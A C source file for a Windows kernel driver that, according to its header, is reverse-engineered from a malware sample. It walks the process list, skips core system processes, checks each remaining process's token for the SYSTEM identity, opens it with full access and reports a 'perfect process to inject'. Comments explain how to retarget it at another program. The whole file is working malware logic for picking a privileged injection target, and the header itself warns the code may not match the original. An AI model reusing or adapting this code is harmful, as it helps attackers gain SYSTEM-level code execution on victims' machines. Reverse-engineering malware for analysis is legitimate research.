/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#include "ProcessHeuristics.h"


BOOLEAN CheckProcess64(HANDLE hProc) {

    UNICODE_STRING routineName;

    RtlInitUnicodeString(&routineName, L"ZwQueryInformationProcess");

    ZwQueryInformationProcess = (QUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&routineName);

    SYSTEM_PROCESSES* sysProcess;

    sysProcess = (SYSTEM_PROCESSES*)64;

    if (ZwQueryInformationProcess == NULL) {

        DbgPrintEx(0, 0, "Error when ZwQueryInformationProcess");

        return FALSE;
    }

    return NT_SUCCESS(ZwQueryInformationProcess(hProc, ProcessBasicInformation, &sysProcess, sizeof(SYSTEM_PROCESSES), NULL));
}

BOOLEAN ExecuteCheckingSecurityIdentifiers(PEPROCESS* peProcess, UNICODE_STRING* unicodePermission) {

    PACCESS_TOKEN pObject = PsReferencePrimaryToken(*peProcess);

    KPROCESSOR_MODE kAccessMode = 0;

    HANDLE hToken = 0;

    NTSTATUS status = ObOpenObjectByPointer(pObject, 0, NULL, 8, NULL, kAccessMode, &hToken);

    ObDereferenceObject(pObject);

    if (status < 0) return FALSE;

    ULONG uReturnLength = 0;

    status = ZwQueryInformationToken(hToken, TokenUser, NULL, 0, &uReturnLength);

    if (status != STATUS_BUFFER_TOO_SMALL) {

        ZwClose(hToken);

        return FALSE;
    }

    PVOID pTokenInformation = ExAllocatePoolWithTag(NonPagedPool, uReturnLength, 'xpp');

    if (pTokenInformation)
        status = ZwQueryInformationToken(hToken, TokenUser, pTokenInformation, uReturnLength, &uReturnLength);

    if (status < 0 || !pTokenInformation) {

        if (pTokenInformation)
            ExFreePoolWithTag(pTokenInformation, 'xpp');

        ZwClose(hToken);

        return FALSE;
    }

    ZwClose(hToken);

    if (!MmIsAddressValid(pTokenInformation) || !MmIsAddressValid(*(PVOID*)pTokenInformation)) return FALSE;

    if (MmIsAddressValid(*(PVOID*)pTokenInformation)) status = RtlConvertSidToUnicodeString(unicodePermission, *(PSID*)pTokenInformation, TRUE);
    else status = STATUS_UNSUCCESSFUL;

    ExFreePoolWithTag(pTokenInformation, 0);

    return NT_SUCCESS(status);
}

BOOLEAN CheckAdjustSecurityIdentifiers(PEPROCESS* peProcess) {

    UNICODE_STRING string;

    return ExecuteCheckingSecurityIdentifiers(peProcess, &string) && wcscmp(string.Buffer, L"S-1-5-18") == 0;

}

BOOLEAN CompareString(WCHAR* stringToCompare, WCHAR* StringToFind) {

    UNICODE_STRING uStringOne;
    UNICODE_STRING uStringTwo;

    memset(&uStringOne, 0, sizeof(uStringOne));
    memset(&uStringTwo, 0, sizeof(uStringTwo));

    RtlInitUnicodeString(&uStringOne, stringToCompare);
    RtlInitUnicodeString(&uStringTwo, StringToFind);

    return RtlCompareUnicodeString(&uStringOne, &uStringTwo, TRUE) == 0;
}

size_t MoveArgumentToStackAndMoveBackToEaxRegister(size_t p1) {
    /*
        move_argument_stack_and_move_back_ret_register proc near
            parametro_variavel = dword ptr  8

            mov     [rsp+parametro_variavel], ecx
            mov     eax, [rsp+parametro_variavel]
            retn
        move_argument_stack_and_move_back_ret_register endp
    */
    return p1;
}

NTSTATUS OpenTargetProcess(SIZE_T* pPID) {

    ULONG ulReturnLenght = 0;

    auto ntStatus = ZwQuerySystemInformation(SystemInformationClass_FLAG, NULL, 0, &ulReturnLenght);

    if (ntStatus != STATUS_INFO_LENGTH_MISMATCH) return ntStatus;

    SYSTEM_PROCESSES* systemProcess = (SYSTEM_PROCESSES*)ExAllocatePoolWithTag(NonPagedPool, 2 * ulReturnLenght, 'xp'); // yes this malware use the 'xp' for the tag name

    if (!systemProcess) return STATUS_NO_MEMORY;

    ntStatus = ZwQuerySystemInformation(SystemInformationClass_FLAG, systemProcess, 2 * ulReturnLenght, NULL);

    if (NT_SUCCESS(ntStatus)) {

        BOOLEAN bFound = 0;
        
        SYSTEM_PROCESSES* i = systemProcess;

        do {

            if (i->ProcessId != MoveArgumentToStackAndMoveBackToEaxRegister(4)
                && i->InheritedFromProcessId != MoveArgumentToStackAndMoveBackToEaxRegister(4)

                //The Driver will compare for process into your blacklist
                && !CompareString(i->ProcessName.Buffer, L"wininit.exe")
                && !CompareString(i->ProcessName.Buffer, L"csrss.exe")
                && !CompareString(i->ProcessName.Buffer, L"smss.exe")
                && !CompareString(i->ProcessName.Buffer, L"services.exe")
                && !CompareString(i->ProcessName.Buffer, L"winlogon.exe")
                && !CompareString(i->ProcessName.Buffer, L"lsass.exe")
                ) {

                PEPROCESS peProcess = 0, peProcess2;

                if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i->ProcessId, &peProcess))) {

                    if (i->ProcessId != *pPID) {

                        ntStatus = PsLookupProcessByProcessId((HANDLE)i->ProcessId, &peProcess2);

                        if (!ntStatus) {

                            BOOLEAN bFlag2 = FALSE;

                            KAPC_STATE kApcState;

                            KeStackAttachProcess(peProcess2, &kApcState);
                            
                            // se quser utilizar outro processo edite essa linha ->  CompareString(i->ProcessName.Buffer, L"brave.exe")
                            // apenas lembre que o processo precisa ser de x64
                            if (CheckAdjustSecurityIdentifiers(&peProcess2)) {

                                OBJECT_ATTRIBUTES objectAtributes;
                                objectAtributes.Length = 48;
                                memset(&objectAtributes.RootDirectory, 0, 20);
                                objectAtributes.SecurityDescriptor = 0i64;
                                objectAtributes.SecurityQualityOfService = 0i64;
                                CLIENT_ID clientId;
                                clientId.UniqueProcess = (HANDLE)i->ProcessId;
                                clientId.UniqueThread = (HANDLE)0;

                                HANDLE hProcess;

                                ntStatus = ZwOpenProcess(&hProcess, 0x1FFFFFu, &objectAtributes, &clientId);

                                if (NT_SUCCESS(ntStatus)) {

                                    if (!CheckProcess64(hProcess)) {

                                        if (bFound)
                                            bFound = FALSE;
                                        else
                                            bFlag2 = TRUE;

                                    }

                                    ZwClose(hProcess);

                                }

                            }

                            KeUnstackDetachProcess(&kApcState);

                            if (bFlag2) {

                                DbgPrintEx(0, 0, "Found a perfect process to inject: %ls", i->ProcessName.Buffer);

                                *pPID = i->ProcessId;

                                return STATUS_SUCCESS;
                            }
                        }

                    }


                }

            }

            i = (SYSTEM_PROCESSES*)((unsigned char*)i + i->NextEntryDelta);

        } while (i->NextEntryDelta);

    }
    else {

        ExFreePoolWithTag(systemProcess, 'xp');

        return ntStatus;
    }

    return STATUS_SUCCESS;
}